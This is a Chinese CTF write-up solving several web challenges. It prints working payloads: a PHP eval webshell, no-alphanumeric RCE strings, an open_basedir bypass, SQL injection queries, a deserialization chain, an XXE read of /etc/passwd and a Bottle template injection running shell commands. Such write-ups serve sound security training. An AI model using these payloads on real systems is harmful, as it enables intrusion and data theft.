[NSSCTF Web区] 部分 WP 1
===

---

# SWPUCTF 2021 新生赛

## [SWPUCTF 2021 新生赛]gift_F12

### 代码审计

直接在源码里看见了:

![1-1.png](1-1.png)

## [SWPUCTF 2021 新生赛]easyupload1.0

打开是一个文件上传界面, 直接传 shell 被拦了

### 文件上传绕过

修改文件头类型就可以绕过了;

![2-1.png](2-1.png)

连接到终端, 有个 flag.php, 可惜不对:

![2-2.png](2-2.png)

枚举了一下发现在环境变量里: `cat /proc/self/environ`

![2-3.png](2-3.png)

## [SWPUCTF 2021 新生赛]easyupload2.0

### 题解

跟上一题类似, 不过传 phtml 就行了:

```php
<script language="php">
    <?=@eval($_POST['shell']);?>
</script>
```

上传成功不过不能执行, 可能是因为 php 版本 >= 7.0 (这种写法在 7.0 后被移除), 直接只传中间这一句就行了:

![3-1.png](3-1.png)

同样的方法就能找到flag:

![3-2.png](3-2.png)

## [SWPUCTF 2021 新生赛]hardrce

### 代码审计

```php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("LTLT说不能用这些奇奇怪怪的符号哦！");
    }}
if(preg_match('/[a-zA-Z]/is',$wllm))
{
    die("Ra's Al Ghul说不能用字母哦！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
} 
```

直接给出了 RCE 的接口, 其中黑名单过滤了大部分控制字符, 注意: `{` `}` `~` `.` `()` `%` 没过滤, 那么这里应该是无字符 RCE

### 无字符 RCE 构造

```python
import urllib.parse


def generate_payload(cmd: str) -> str:
    # 将字符串逐字节取反 (~)，并转成对应的字节（0-255 范围）
    inverted_bytes = bytes([~ord(c) & 0xFF for c in cmd])
    # 使用 quote_from_bytes 确保不会出现 UTF-8 多字节编码
    encoded = urllib.parse.quote_from_bytes(inverted_bytes)
    # 返回形式 ~payload
    return "~" + encoded


if __name__ == "__main__":
    cmd = "system"
    payload = generate_payload(cmd)
    print("原始命令:", cmd)
    print("生成的 URL payload:", payload)

```

注意 `eval($a)` 这样的语句中, 如果需要 `$a` 是函数名 + 参数的组合, 例如 `system('whoami')` 那么传入参数应该是 `$a=(system)(whoami)`, 这里再分别取反即可, 这种括号分两段的方式也是 php eval 函数解析的特点;

> 别忘了分号;

### 执行

执行成功:

![4-1.png](4-1.png)

继续:

![4-2.png](4-2.png)

得到 flag

## [SWPUCTF 2021 新生赛]hardrce_3

### 代码审计

```php
<?php
header("Content-Type:text/html;charset=utf-8");
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['wllm']))
{
    $wllm = $_GET['wllm'];
    $blacklist = [' ','\^','\~','\|'];
    foreach ($blacklist as $blackitem)
    {
        if (preg_match('/' . $blackitem . '/m', $wllm)) {
        die("小伙子只会异或和取反？不好意思哦LTLT说不能用！！");
    }}
if(preg_match('/[a-zA-Z0-9]/is',$wllm))
{
    die("Ra'sAlGhul说用字母数字是没有灵魂的！");
}
echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";
eval($wllm);
}
else
{
    echo "蔡总说：注意审题！！！";
}
?> 
```

跟刚刚差不多, 是一个显然的 RCE, 这次禁止了 `~` `^`

### 无字符 RCE 构造

总结一下无字符 RCE 的主要构造方式:

- 取反: `~`;
- 异或: `^`;
- 或: `|`;
- 自增: `++`;
- 临时文件: 反引号

那么这里应该是用自增;

### 自增马

用这个 payload:

```
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
```

相当于传入了:

```
eval(@_POST[_]);
```

这样传参实际转移到了 POST 方法中, 而这里是没有 WAF 的;

URL 编码:

```
%24%5F%3D%5B%5D%3B%24%5F%3D%40%22%24%5F%22%3B%24%5F%3D%24%5F%5B%27%21%27%3D%3D%27%40%27%5D%3B%24%5F%5F%5F%3D%24%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%5F%5F%3D%27%5F%27%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%5F%3D%24%5F%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%2B%2B%3B%24%5F%5F%5F%5F%2E%3D%24%5F%5F%3B%24%5F%3D%24%24%5F%5F%5F%5F%3B%24%5F%5F%5F%28%24%5F%5B%5F%5D%29%3B
```

然后在 POST 里插入:

```
_=eval($_POST['xxx'])&xxx
```

传入成功:

![5-1.png](5-1.png)

用蚁剑连接这个地址, 密码就是 POST:

![5-2.png](5-2.png)

![5-3.png](5-3.png)

连上后回显 `ret=127`, 说明极有可能限制了 php 函数; 不过用蚁剑的文件管理功能已经能读到 flag 了

![5-4.png](5-4.png)

### 突破 disable_function 限制

> 之前这道题里已经遇到过一次: [[SUCTF 2019] easyweb](https://r4x.top/2025/07/20/SUCTF2019-easyweb/#%E7%AA%81%E7%A0%B4-PHP-disable-functions-%E9%99%90%E5%88%B6)

可以直接按照上面这个方法在根目录建一个 bypass.php, 或者也可以在 POST 中加入写文件指令:

```php
# _=
file_put_contents('exploit.php', "<?php
mkdir('test'); 
chdir('test'); 
ini_set('open_basedir','..');
chdir('..'); chdir('..'); chdir('..'); chdir('..');
ini_set('open_basedir','/');
echo file_get_contents('flag');
?>");
# 然后 URL 编码
```

> 再写一遍, 这个利用的原理就是写入一个 exploit.php 文件, 然后将 `open_basedir` 改为 `..`, 注意, 这是一个相对路径, 所以 `chdir('..')` 会一直成功, 直到穿到根目录, 最后 `ini_set('open_basedir','/');` 成功直接把访问范围扩大到根目录。

执行完毕后访问这个 php 文件, 即可读出 flag:

![5-5.png](5-5.png)

## [SWPUCTF 2021 新生赛]error

### 报错注入

输个引号, 爆出错误, 是 MariaDB:

![6-1.png](6-1.png)

```sql
-- 爆出库名: XPATH syntax error: '~test_db~'
1' AND updatexml(1 ,concat(0x7e,(SELECT database()),0x7e),1) --; 
```

```sql
-- 爆出表名: XPATH syntax error: '~test_tb,users~'
1' AND updatexml(1 ,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema='test_db'),0x7e),1) --  
```

```sql
--爆出列名: XPATH syntax error: '~id,flag~'
1' AND updatexml(1 ,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='test_tb'),0x7e),1) --  
```

```sql
-- 爆出 flag: 
-- XPATH syntax error: '~NSSCTF{73feb461-21b7-4017-8c10-'
1' AND updatexml(1 ,concat(0x7e,(SELECT (flag) FROM test_tb LIMIT 0,1),0x7e),1) --  
```

说明被截断了:

```sql
-- 分批次爆出 flag: 修改 SUBSTRING 的起点即可
-- XPATH syntax error: '~NSSCTF{73feb461-21b7-401~'
-- XPATH syntax error: '~7-4017-8c10-c258c2eb1026~'
-- XPATH syntax error: '~1026}~'
1' AND updatexml(1,concat(0x7e,SUBSTRING((SELECT flag FROM test_tb LIMIT 0,1),1,24),0x7e),1) --
```

拼起来: `NSSCTF{73feb461-21b7-4017-8c10-c258c2eb1026}`

## [SWPUCTF 2021 新生赛]pop

### 代码审计

显然是一个反序列化的漏洞。不过这个漏洞要利用不能一步到位, 要后往前推构造一条利用链。

```php
 <?php

error_reporting(0);
show_source("index.php");

class w44m{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    # __destruct 会在反序列化后直接调用, 因此是第一环
    public function __destruct(){
        # echo 处如果是一个对象就会调用__toString
        echo $this->w00m;
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        # 结合前面, 如果 w00m 是对象, 那么 w22m 是对象方法名, 这里调用的实际上是 w00m 的 w22m 方法, 可以是 w44m->Getflag()
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);

?> 
```

传入 `$w00m` => `$w22m` => `$w33m` => `$w44m`:

具体来说:
`w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()`

### 构造 payload

```php
<?php
class w44m{

    private $admin = 'w44m';
    protected $passwd = '08067';

}

class w22m{
    public $w00m;
}

class w33m{
    public $w00m;
    public $w22m;

}
# w22m.__destruct().w00m->w33m.__toString().w00m->w44m.Getflag()
$a = new w22m();
$b = new w33m();
$c = new w44m();
# 入口
$a->w00m=$b;
# pop 链子
$b->w00m=$c;
$b->w22m='Getflag';
echo urlencode(serialize($a));
?>
```

提交:

![7-1.png](7-1.png)

---

# GHCTF 2025

## [GHCTF 2025]SQL

### 基本探测

拿到发现 URL 里是 GET 传参的 SQL 查询, 尝试:

```
?id=0 union select 1,2,3,4,5 order by 5--
```

![8-1.png](8-1.png)

接下来尝试 `database()` 时报错, 可能是 SQLite, 试试 `select sql from sqlite_master`: 

`sqlite_master` 表的结构包含以下几个字段：

- type: 记录项目的类型，如table、index、view、trigger。
- name: 记录项目的名称，如表名、索引名等。
- tbl_name: 记录所从属的表名，对于表来说，该列就是表名本身。
- rootpage: 记录项目在数据库页中存储的编号。对于视图和触发器，该列值为0或者NULL。
- sql: 记录创建该项目的SQL语句。

比如这个结构:

|type|name|tbl_name|rootpage|sql|
|----|----|----|----|----|
|table|employees|employees|2|CREATE TABLEemployees(id INTEGER PRIMARY KEY, name TEXT, dept TEXT, salary REAL)|
|table|departments|departments|5|CREATE TABLE departments(dept_id INTEGER, dept_name TEXT UNIQUE)|
|index|sqlite_autoindex_departments_1|departments|8|NULL (自动为 UNIQUE 约束创建的索引)|
|index|idx_emp_salary|employees|11|CREATE INDEX idx_emp_salary ON employees(salary DESC)|
|view|high_salary_emp|high_salary_emp|0|CREATE VIEW high_salary_emp AS SELECT * FROM employees WHERE salary > 10000|
|trigger|audit_emp_update|employees|0|CREATE TRIGGER audit_emp_update AFTER UPDATE ON employees BEGIN INSERT INTO audit_log VALUES(old.id, datetime('now')); END|

![8-2.png](8-2.png)

### SQlite 数字型注入

至此可以确定是 SQLite 数据库且几乎没有过滤, 根据刚刚的结果已经知道了有一张 flag 表, 其只有一列, 名为 flag"

```
?id=0 union select 1,group_concat(flag),3,4,5 from flag--
```

爆出 flag;

![8-3.png](8-3.png)

## [GHCTF 2025] (>﹏<)

### 源码审计

简单的 flask 应用, 提供了读 xml 功能:

```python
from flask import Flask,request
import base64
from lxml import etree
import re
app = Flask(__name__)

@app.route('/')
def index():
    return open(__file__).read()


@app.route('/ghctf',methods=['POST'])
def parse():
    xml=request.form.get('xml')
    print(xml)
    if xml is None:
        return "No System is Safe."
    parser = etree.XMLParser(load_dtd=True, resolve_entities=True)
    root = etree.fromstring(xml, parser)
    name=root.find('name').text
    return name or None



if __name__=="__main__":
    app.run(host='0.0.0.0',port=8080)
```

关键方法:

`etree.XMLParser` 是 lxml.etree 模块中的一个类，用于自定义 XML 解析行为。

```python
from lxml import etree

parser = etree.XMLParser(
    encoding=None,                # 指定编码
    recover=False,                # 是否自动修复损坏的 XML
    remove_blank_text=False,      # 是否移除空白文本节点
    remove_comments=False,        # 是否移除注释
    remove_pis=False,             # 是否移除处理指令
    strip_cdata=True,             # 是否将 CDATA 区域转为普通文本
    resolve_entities=True,        # 是否解析实体（XXE 漏洞相关）
    load_dtd=False,               # 是否加载 DTD
    no_network=False,             # 是否允许网络加载 DTD
)
tree = etree.fromstring(xml_string, parser)
```

resolve_entities=True 和 load_dtd=True 可能导致 XXE 漏洞。

### XXE 漏洞

当上文两项都为 True, 将可以解析 XML 中的外部协议, 例如经典的 payload:

```
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <name>&xxe;</name>
</root>
```

这里要 POST 传参, 那么将该 XML payload URL 编码后传入即可:

![9-1.png](9-1.png)

## [GHCTF 2025]Message in a Bottle plus

### 题解

打开是个留言板, 尝试 SQL 注入无果, SSTI 发现 `{}` `()` 均被过滤了, 根据题目名字想到 bottle 模板:

Bottle 模板中 (SimpleTemplate), 行首的 `%` 表示 Python 语句, 仅执行, `{{ ... }}` 表示 Python 表达式, 而普通字符串会被原样输出。

需要注意的是, 由 `<div>` + `</div>` 或者 `"""` 包裹的字符串会被视为普通字符串, 然而其中包含的 `% expression` 语句依然会被解析, 这里尖括号被过滤, 因此使用这个 payload 就可以绕过:

```python
"""
 % import os
 % flag_data = os.popen("cat /f*").read()
 % __import__('bottle').abort(200, flag_data)
"""
```

![10-1.png](10-1.png)

## [GHCTF 2025]UPUPUP

### 题解

打开发现是个文件上传界面, 那还是老规矩, 直接传 shell.php 是不行的, 尝试改文件头, 依然不行, 可能是文件后缀做了黑名单, 只能传个 shell.jpg 上去:

> `.php3`, `.phtml` 等也被拦了; 

![11-1.png](11-1.png)

那么下一步考虑一下能不能传 `.htaccess`:

直接上传不允许, 修改包里的文件类型并加个前缀后就通过了;

![11-2.png](11-2.png)

并且两个文件在同一个目录下, 那可以直接蚁剑连上;

![11-3.png](11-3.png)

![11-4.png](11-4.png)

---

~做到这里金币花完了, 过几天继续好了。~